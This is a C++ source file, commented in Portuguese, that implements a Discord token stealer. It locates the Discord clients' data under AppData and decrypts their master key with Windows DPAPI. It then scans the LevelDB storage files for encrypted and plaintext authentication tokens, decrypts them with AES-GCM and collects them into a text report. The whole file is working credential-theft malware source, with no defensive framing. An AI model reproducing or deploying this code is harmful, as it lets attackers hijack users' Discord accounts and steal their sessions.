#include "discord.h"
#include <bcrypt.h>
#pragma comment(lib, "bcrypt.lib")

// ── Helpers ───────────────────────────────────────────────────────────────────
static std::string wide_to_utf8(const wchar_t* ws) {
    if (!ws || !ws[0]) return {};
    int len = WideCharToMultiByte(CP_UTF8, 0, ws, -1, nullptr, 0, nullptr, nullptr);
    std::string s(len - 1, '\0');
    WideCharToMultiByte(CP_UTF8, 0, ws, -1, s.data(), len, nullptr, nullptr);
    return s;
}

static std::wstring get_appdata() {
    wchar_t path[MAX_PATH] = {};
    SHGetFolderPathW(nullptr, CSIDL_APPDATA, nullptr, 0, path);
    return path;
}

static std::vector<uint8_t> read_file_shared(const std::filesystem::path& path) {
    HANDLE h = CreateFileW(path.c_str(), GENERIC_READ,
        FILE_SHARE_READ | FILE_SHARE_WRITE | FILE_SHARE_DELETE,
        nullptr, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, nullptr);
    if (h == INVALID_HANDLE_VALUE) return {};
    LARGE_INTEGER sz = {};
    GetFileSizeEx(h, &sz);
    if (sz.QuadPart == 0 || sz.QuadPart > 64 * 1024 * 1024) { CloseHandle(h); return {}; }
    std::vector<uint8_t> data((size_t)sz.QuadPart);
    DWORD read = 0;
    ReadFile(h, data.data(), (DWORD)sz.QuadPart, &read, nullptr);
    CloseHandle(h);
    data.resize(read);
    return data;
}

// ── DPAPI → master key ────────────────────────────────────────────────────────
static std::vector<uint8_t> get_discord_master_key(const std::filesystem::path& discord_dir) {
    auto raw = read_file_shared(discord_dir / "Local State");
    if (raw.empty()) return {};
    std::string content(raw.begin(), raw.end());
    const std::string marker = "\"encrypted_key\":\"";
    size_t pos = content.find(marker);
    if (pos == std::string::npos) return {};
    pos += marker.size();
    size_t end = content.find('"', pos);
    if (end == std::string::npos) return {};
    std::string b64 = content.substr(pos, end - pos);
    DWORD bin_len = 0;
    CryptStringToBinaryA(b64.c_str(), (DWORD)b64.size(), CRYPT_STRING_BASE64, nullptr, &bin_len, nullptr, nullptr);
    if (bin_len <= 5) return {};
    std::vector<uint8_t> enc(bin_len);
    CryptStringToBinaryA(b64.c_str(), (DWORD)b64.size(), CRYPT_STRING_BASE64, enc.data(), &bin_len, nullptr, nullptr);
    DATA_BLOB in_blob  = { (DWORD)(bin_len - 5), enc.data() + 5 };
    DATA_BLOB out_blob = {};
    if (!CryptUnprotectData(&in_blob, nullptr, nullptr, nullptr, nullptr, 0, &out_blob)) return {};
    std::vector<uint8_t> key(out_blob.pbData, out_blob.pbData + out_blob.cbData);
    LocalFree(out_blob.pbData);
    return key;
}

// ── AES-256-GCM ───────────────────────────────────────────────────────────────
struct AesGcmSession {
    BCRYPT_ALG_HANDLE hAlg = nullptr;
    BCRYPT_KEY_HANDLE hKey = nullptr;  // publico para debug

    bool init(const std::vector<uint8_t>& key) {
        if (key.size() != 32) return false;
        if (BCryptOpenAlgorithmProvider(&hAlg, BCRYPT_AES_ALGORITHM, nullptr, 0)) return false;
        if (BCryptSetProperty(hAlg, BCRYPT_CHAINING_MODE,
            (PUCHAR)BCRYPT_CHAIN_MODE_GCM, sizeof(BCRYPT_CHAIN_MODE_GCM), 0)) return false;
        struct { BCRYPT_KEY_DATA_BLOB_HEADER hdr; uint8_t data[32]; } blob;
        blob.hdr.dwMagic = BCRYPT_KEY_DATA_BLOB_MAGIC;
        blob.hdr.dwVersion = BCRYPT_KEY_DATA_BLOB_VERSION1;
        blob.hdr.cbKeyData = 32;
        memcpy(blob.data, key.data(), 32);
        return BCryptImportKey(hAlg, nullptr, BCRYPT_KEY_DATA_BLOB,
            &hKey, nullptr, 0, (PUCHAR)&blob, sizeof(blob), 0) == 0;
    }

    bool decrypt(const uint8_t* nonce, const uint8_t* ct, ULONG ct_len,
                 const uint8_t* tag, std::string& out) const {
        BCRYPT_AUTHENTICATED_CIPHER_MODE_INFO ai;
        BCRYPT_INIT_AUTH_MODE_INFO(ai);
        ai.pbNonce = (PUCHAR)nonce; ai.cbNonce = 12;
        ai.pbTag   = (PUCHAR)tag;   ai.cbTag   = 16;
        std::vector<uint8_t> buf(ct_len);
        ULONG out_len = 0;
        if (BCryptDecrypt(hKey, (PUCHAR)ct, ct_len, &ai,
            nullptr, 0, buf.data(), ct_len, &out_len, 0)) return false;
        out.assign((char*)buf.data(), out_len);
        return true;
    }

    ~AesGcmSession() {
        if (hKey) BCryptDestroyKey(hKey);
        if (hAlg) BCryptCloseAlgorithmProvider(hAlg, 0);
    }
};

// ── Diagnóstico: mostra hex ao redor de "token" e padrões conhecidos ──────────
static void diagnose_file(const std::filesystem::path& fpath, const std::vector<uint8_t>& content) {
    auto hex_dump = [&](size_t from, size_t to) {
        for (size_t j = from; j < to; j += 16) {
            printf("    %06zX: ", j);
            size_t row_end = (std::min)(to, j + 16);
            for (size_t k = j; k < row_end; ++k)
                printf("%02X ", (unsigned)content[k]);
            for (size_t k = row_end; k < j + 16; ++k) printf("   ");
            printf(" | ");
            for (size_t k = j; k < row_end; ++k)
                printf("%c", (content[k] >= 0x20 && content[k] < 0x7F) ? content[k] : '.');
            printf("\n");
        }
    };

    // 1. Busca "token" em ASCII
    const uint8_t tok_ascii[] = { 't','o','k','e','n' };
    // 2. Busca "token" em UTF-16LE
    const uint8_t tok_utf16[] = { 't',0,'o',0,'k',0,'e',0,'n',0 };
    // 3. Busca "v10" em ASCII
    const uint8_t v10_ascii[] = { 'v','1','0' };
    // 4. Busca "v10" em UTF-16LE
    const uint8_t v10_utf16[] = { 'v',0,'1',0,'0',0 };
    // 5. Busca "dQw4" (prefixo base64 de tokens encriptados)
    const uint8_t dqw4_ascii[] = { 'd','Q','w','4' };

    auto search_pattern = [&](const uint8_t* pat, size_t pat_len, const char* label) {
        int hits = 0;
        for (size_t i = 0; i + pat_len <= content.size(); ++i) {
            if (memcmp(content.data() + i, pat, pat_len) != 0) continue;
            if (hits == 0)
                printf("  [%s] encontrado em %s:\n", label, fpath.filename().string().c_str());
            size_t from = (i > 64) ? i - 64 : 0;
            size_t to   = (std::min)(content.size(), i + 128);
            hex_dump(from, to);
            printf("\n");
            if (++hits >= 3) break; // mostra ate 3 ocorrencias
        }
        if (hits == 0)
            printf("  [%s] nao encontrado em %s\n", label, fpath.filename().string().c_str());
    };

    search_pattern(tok_ascii, sizeof(tok_ascii), "token ASCII");
    search_pattern(tok_utf16, sizeof(tok_utf16), "token UTF-16LE");
    search_pattern(v10_ascii, sizeof(v10_ascii), "v10 ASCII");
    search_pattern(v10_utf16, sizeof(v10_utf16), "v10 UTF-16LE");
    search_pattern(dqw4_ascii, sizeof(dqw4_ascii), "dQw4 (b64 token)");
}

// ── Decodifica blob UTF-16LE → bytes ─────────────────────────────────────────
// Cada char UTF-16LE (2 bytes, byte high = 0) → 1 byte
static std::vector<uint8_t> decode_utf16le_blob(
    const uint8_t* src, size_t count_chars) // count_chars = número de caracteres (pares)
{
    std::vector<uint8_t> out;
    out.reserve(count_chars);
    for (size_t i = 0; i < count_chars; ++i)
        out.push_back(src[i * 2]); // pega apenas o byte baixo de cada par
    return out;
}

// ── Tenta descriptografar um blob binário (v10 + nonce + ct + tag) ────────────
static bool try_decrypt_blob(const AesGcmSession& session,
    const uint8_t* blob, size_t blob_len,
    const std::regex& tok_re, std::string& out_token)
{
    // formato: "v10" (3 bytes) | nonce (12) | ciphertext (var) | tag (16)
    if (blob_len < 3 + 12 + 1 + 16) return false;
    if (blob[0] != 'v' || blob[1] != '1' || (blob[2] != '0' && blob[2] != '1')) return false;

    const uint8_t* nonce    = blob + 3;
    const uint8_t* ct_start = blob + 3 + 12;
    size_t max_ct = blob_len - 3 - 12 - 16;

    // O tamanho exato: blob_len - 3 (prefix) - 12 (nonce) - 16 (tag) = ciphertext len
    size_t ct_len = max_ct;
    const uint8_t* tag = ct_start + ct_len;

    std::string plain;
    if (!session.decrypt(nonce, ct_start, (ULONG)ct_len, tag, plain)) return false;
    if (!std::regex_match(plain, tok_re)) return false;
    out_token = plain;
    return true;
}

// ── Scan completo: dQw4 (moderno) → ASCII → UTF-16LE → plaintext ─────────────
static void scan_all(
    const std::filesystem::path& leveldb_dir,
    const std::vector<uint8_t>& master_key,   // para criar sessao fresca no dQw4
    const AesGcmSession& session,
    const std::string& label,
    std::set<std::string>& seen,
    std::vector<DiscordToken>& out,
    bool diagnose)
{
    if (!std::filesystem::exists(leveldb_dir)) return;

    static const std::regex tok_re(
        R"(([\w-]{22,32}\.[\w-]{6}\.[\w-]{27,40})|(mfa\.[\w-]{84}))"
    );

    try {
        for (const auto& entry : std::filesystem::directory_iterator(leveldb_dir)) {
            auto ext = entry.path().extension().string();
            if (ext != ".ldb" && ext != ".log") continue;

            auto content = read_file_shared(entry.path());
            if (content.empty()) {
                printf("  [!] Lock/erro ao ler: %s\n",
                    entry.path().filename().string().c_str());
                continue;
            }

            printf("  [scan] %s (%zu bytes)\n",
                entry.path().filename().string().c_str(), content.size());

            if (diagnose) {
                diagnose_file(entry.path(), content);
                continue; // em modo diagnóstico não tenta decrypt
            }

            // ── 1. dQw4w9WgXcQ: (moderno, sessao fresca por seguranca) ─────
            // Cria uma nova sessao BCrypt independente para o dQw4 scan
            // evitando qualquer corrupcao de estado dos scans v10 abaixo.
            {
                AesGcmSession fresh;
                if (fresh.init(master_key)) {
                    const char prefix[] = "dQw4w9WgXcQ:";
                    const size_t prefix_len = strlen(prefix);
                    for (size_t i = 0; i + prefix_len < content.size(); ++i) {
                        if (memcmp(content.data() + i, prefix, prefix_len) != 0) continue;

                        // Coleta base64: para no primeiro byte nao-base64-valido
                        size_t j = i + prefix_len;
                        size_t max_j = (std::min)(content.size(), j + 512);
                        while (j < max_j) {
                            uint8_t c = content[j];
                            bool v = (c >= 'A' && c <= 'Z') || (c >= 'a' && c <= 'z') ||
                                     (c >= '0' && c <= '9') || c == '+' || c == '/' || c == '=';
                            if (!v) break;
                            ++j;
                        }
                        if (j <= i + prefix_len + 20) continue;

                        std::string b64(content.begin() + i + prefix_len, content.begin() + j);
                        DWORD bin_len = 0;
                        CryptStringToBinaryA(b64.c_str(), (DWORD)b64.size(),
                            CRYPT_STRING_BASE64, nullptr, &bin_len, nullptr, nullptr);
                        if (bin_len < 3 + 12 + 40 + 16) continue;

                        std::vector<uint8_t> blob(bin_len);
                        if (!CryptStringToBinaryA(b64.c_str(), (DWORD)b64.size(),
                            CRYPT_STRING_BASE64, blob.data(), &bin_len, nullptr, nullptr)) continue;

                        std::string plain;
                        if (!try_decrypt_blob(fresh, blob.data(), bin_len, tok_re, plain)) {
                            // Re-init session apos falha
                            fresh.~AesGcmSession();
                            new (&fresh) AesGcmSession();
                            fresh.init(master_key);
                            continue;
                        }
                        if (!seen.count(plain)) {
                            seen.insert(plain);
                            out.push_back({ plain, label + " [dQw4-b64]" });
                            printf("  [+] Token dQw4-b64 encontrado!\n");
                        }
                        // Re-init session para proximo candidato
                        fresh.~AesGcmSession();
                        new (&fresh) AesGcmSession();
                        fresh.init(master_key);
                    }
                }
            }

            // ── 2. Plaintext (legado) ─────────────────────────────────────
            {
                std::string text(content.begin(), content.end());
                for (char& c : text) if (c == '\0') c = ' ';
                auto it = std::sregex_iterator(text.begin(), text.end(), tok_re);
                for (; it != std::sregex_iterator(); ++it) {
                    std::string tok = it->str();
                    if (!seen.count(tok)) {
                        seen.insert(tok);
                        out.push_back({ tok, label + " [plaintext]" });
                        printf("  [+] Token plaintext encontrado!\n");
                    }
                }
            }

            // ── 3. v10 ASCII ─────────────────────────────────────────────
            for (size_t i = 0; i + 3 + 12 + 1 + 16 <= content.size(); ++i) {
                if (content[i] != 'v' || content[i+1] != '1') continue;
                if (content[i+2] != '0' && content[i+2] != '1') continue;
                for (size_t ct_len = 40; ct_len <= 200; ++ct_len) {
                    size_t total = 3 + 12 + ct_len + 16;
                    if (i + total > content.size()) break;
                    std::string plain;
                    if (!try_decrypt_blob(session, content.data() + i, total, tok_re, plain)) continue;
                    if (!seen.count(plain)) {
                        seen.insert(plain);
                        out.push_back({ plain, label + " [v10-ASCII]" });
                        printf("  [+] Token v10-ASCII encontrado!\n");
                    }
                    break;
                }
            }

            // ── 4. v10 UTF-16LE ───────────────────────────────────────────
            for (size_t i = 0; i + 6 <= content.size(); ++i) {
                if (content[i]   != 0x76 || content[i+1] != 0x00) continue;
                if (content[i+2] != 0x31 || content[i+3] != 0x00) continue;
                if ((content[i+4] != 0x30 && content[i+4] != 0x31) || content[i+5] != 0x00) continue;
                size_t chars_avail = (content.size() - i) / 2;
                if (chars_avail < 3 + 12 + 40 + 16) continue;
                for (size_t ct_len = 40; ct_len <= 200; ++ct_len) {
                    size_t total_chars = 3 + 12 + ct_len + 16;
                    if (i + total_chars * 2 > content.size()) break;
                    auto blob = decode_utf16le_blob(content.data() + i, total_chars);
                    std::string plain;
                    if (!try_decrypt_blob(session, blob.data(), blob.size(), tok_re, plain)) continue;
                    if (!seen.count(plain)) {
                        seen.insert(plain);
                        out.push_back({ plain, label + " [v10-UTF16LE]" });
                        printf("  [+] Token v10-UTF16LE encontrado!\n");
                    }
                    break;
                }
            }
        }
    } catch (...) {}
}

// ── API pública ───────────────────────────────────────────────────────────────
std::vector<DiscordToken> collect_discord_tokens(bool diagnose) {
    std::vector<DiscordToken> result;
    std::set<std::string> seen;

    const wchar_t* variants[] = {
        L"discord", L"discordcanary", L"discordptb", L"discorddevelopment"
    };

    for (const auto* variant : variants) {
        std::filesystem::path dir = std::filesystem::path(get_appdata()) / variant;
        if (!std::filesystem::exists(dir)) continue;

        std::string label = wide_to_utf8(variant);
        printf("\n[discord] Verificando: %s\n", label.c_str());

        auto master_key = get_discord_master_key(dir);
        if (master_key.empty()) {
            printf("  [!] Master key nao encontrada\n");
            continue;
        }
        printf("  [*] Master key OK (%zu bytes)\n", master_key.size());

        AesGcmSession session;
        if (!session.init(master_key)) {
            printf("  [!] Falha ao inicializar AES-GCM\n");
            continue;
        }

        scan_all(dir / "Local Storage" / "leveldb",
                 master_key, session, label, seen, result, diagnose);
    }

    return result;
}

std::string discord_to_text(const std::vector<DiscordToken>& tokens) {
    std::ostringstream oss;
    oss << "=== Discord Tokens ===\n";
    if (tokens.empty()) {
        oss << "(nenhum token encontrado)\n";
    } else {
        for (size_t i = 0; i < tokens.size(); ++i)
            oss << "[" << i+1 << "] " << tokens[i].token
                << "  [fonte: " << tokens[i].source << "]\n";
    }
    return oss.str();
}
